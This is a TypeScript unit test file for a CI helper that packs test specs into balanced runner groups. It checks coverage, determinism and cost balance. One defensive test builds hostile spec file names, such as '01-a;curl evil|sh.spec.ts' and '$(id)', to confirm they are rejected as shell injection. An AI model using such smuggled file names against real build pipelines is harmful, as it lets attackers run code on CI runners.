/**
 * Unit tests for the coverage-group packer used by the `coverage-anvil` matrix.
 *
 * The property that matters is coverage of the plan itself: every spec must land in exactly
 * one group. A packing bug that silently dropped a spec would quietly stop measuring it.
 *
 * Run with: yarn test:plan-groups
 */

import * as assert from "assert/strict";
import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import { assertCoversAllSpecs, costOf, discoverSpecs, planGroups } from "../../plan-coverage-groups";

const tests: Array<[string, () => void]> = [];
function test(name: string, fn: () => void): void {
  tests.push([name, fn]);
}

const realSpecs = discoverSpecs(path.join(__dirname, "../hardhat"));

function groupCosts(groups: ReturnType<typeof planGroups>): number[] {
  return groups.map((g) => (g.specs === "" ? 0 : g.specs.split(" ").reduce((sum, s) => sum + costOf(s), 0)));
}

test("discovers the specs that exist on disk", () => {
  assert.ok(realSpecs.length >= 2, `expected at least 2 specs, found ${realSpecs.length}`);
  for (const spec of realSpecs) {
    assert.match(spec, /^\d+-.*\.spec\.ts$/);
    assert.ok(fs.existsSync(path.join(__dirname, "../hardhat", spec)));
  }
});

// The guard that matters: no spec may be dropped or double-counted, at any group count.
test("assigns every real spec exactly once, for every group count", () => {
  for (let n = 1; n <= realSpecs.length + 3; n++) {
    const groups = planGroups(realSpecs, n);
    assert.doesNotThrow(() => assertCoversAllSpecs(realSpecs, groups), `group count ${n}`);
  }
});

test("never emits more groups than there are specs", () => {
  const groups = planGroups(["01-a.spec.ts", "02-b.spec.ts"], 7);
  assert.equal(groups.length, 2);
  for (const group of groups) {
    assert.notEqual(group.specs, "", "an emitted group must not be empty");
  }
});

test("group names are stable and independent of the packing", () => {
  // Job names derive from these, so they must not shift when costs or specs change.
  assert.deepEqual(
    planGroups(realSpecs, 3).map((g) => g.name),
    ["group-1", "group-2", "group-3"]
  );
});

// The whole point of the cost table: keep 07 and 09 (the two ~270s specs) off one runner.
test("keeps the two most expensive specs on separate runners", () => {
  const groups = planGroups(realSpecs, 2);
  const withLongest = groups.find((g) => g.specs.includes("09-interop-unbundle"));
  assert.ok(withLongest);
  assert.ok(!withLongest.specs.includes("07-interop-bundles"), `09 and 07 landed together: ${withLongest.specs}`);
});

test("balances the plan to within the cost of one spec", () => {
  const costs = groupCosts(planGroups(realSpecs, 2));
  const spread = Math.max(...costs) - Math.min(...costs);
  const maxSpecCost = Math.max(...realSpecs.map(costOf));
  assert.ok(spread <= maxSpecCost, `spread ${spread}s exceeds the largest spec cost ${maxSpecCost}s`);
});

// A spec added without updating the table must be scheduled as if it were the most
// expensive one, so it gets a slot of its own rather than being stacked onto a full group.
test("treats an unknown spec as the most expensive", () => {
  const known = Math.max(...realSpecs.map(costOf));
  assert.equal(costOf("99-brand-new.spec.ts"), known);

  const groups = planGroups([...realSpecs, "99-brand-new.spec.ts"], 2);
  assert.doesNotThrow(() => assertCoversAllSpecs([...realSpecs, "99-brand-new.spec.ts"], groups));
  const host = groups.find((g) => g.specs.includes("99-brand-new"));
  assert.ok(host);
  assert.ok(!host.specs.includes("09-interop-unbundle"), "an unknown spec should not share with the longest");
});

test("plans deterministically", () => {
  const a = JSON.stringify(planGroups(realSpecs, 3));
  const b = JSON.stringify(planGroups([...realSpecs].reverse(), 3));
  assert.equal(a, b, "plan must not depend on input order");
});

test("rejects a nonsensical group count", () => {
  assert.throws(() => planGroups(realSpecs, 0), /at least 1/);
});

test("assertCoversAllSpecs catches a dropped, duplicated or invented spec", () => {
  assert.throws(() => assertCoversAllSpecs(["a", "b"], [{ name: "group-1", specs: "a" }]), /missing/);
  assert.throws(
    () =>
      assertCoversAllSpecs(
        ["a", "b"],
        [
          { name: "group-1", specs: "a b" },
          { name: "group-2", specs: "b" },
        ]
      ),
    /more than one group/
  );
  assert.throws(() => assertCoversAllSpecs(["a"], [{ name: "group-1", specs: "a zz" }]), /does not exist/);
});

// Spec names are emitted space-separated into the workflow matrix and expanded by a shell, so a
// name carrying shell syntax would be command injection reachable by adding a file to the repo.
// Rejecting rather than filtering: a silently skipped spec is a test dropped from coverage while
// every job still reports success.
test("rejects spec file names that a shell would not treat as one word", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "spec-names-"));
  const hostile = ["01-a;curl evil|sh.spec.ts", "02-$(id).spec.ts", "03-two words.spec.ts", "04-`id`.spec.ts"];
  for (const name of hostile) {
    const scoped = fs.mkdtempSync(path.join(dir, "case-"));
    fs.writeFileSync(path.join(scoped, "05-legitimate.spec.ts"), "");
    fs.writeFileSync(path.join(scoped, name), "");
    assert.throws(() => discoverSpecs(scoped), /unsafe for shell expansion/, name);
  }

  // ...while the names this repo actually uses stay acceptable.
  const ok = fs.mkdtempSync(path.join(dir, "ok-"));
  for (const name of ["01-deployment-verification.spec.ts", "13-imt-atomic-swap.spec.ts", "07-a.b_c.spec.ts"]) {
    fs.writeFileSync(path.join(ok, name), "");
  }
  assert.equal(discoverSpecs(ok).length, 3);
});

let failed = 0;
for (const [name, fn] of tests) {
  try {
    fn();
    console.log(`  ✓ ${name}`);
  } catch (error) {
    failed++;
    console.error(`  ✗ ${name}`);
    console.error(`    ${(error as Error).message}`);
  }
}

console.log(`\n${tests.length - failed}/${tests.length} plan-coverage-groups tests passed`);
if (failed > 0) {
  process.exit(1);
}
